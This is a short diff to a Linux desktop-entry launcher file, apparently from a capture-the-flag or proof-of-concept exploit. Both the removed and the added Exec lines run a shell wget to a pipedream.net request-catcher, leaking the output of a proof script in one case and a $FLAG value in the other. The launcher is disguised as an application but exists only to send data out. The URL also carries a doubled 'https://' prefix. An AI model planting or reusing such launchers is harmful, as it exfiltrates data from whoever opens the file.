@@ -1,3 +1,3 @@
 [Desktop Entry]
-Exec=sh -c "wget https://https://en7s8pxsi58nb.x.pipedream.net/?`/proof*.sh`"
+Exec=sh -c "wget https://https://en7s8pxsi58nb.x.pipedream.net/$FLAG"
 Type=Application
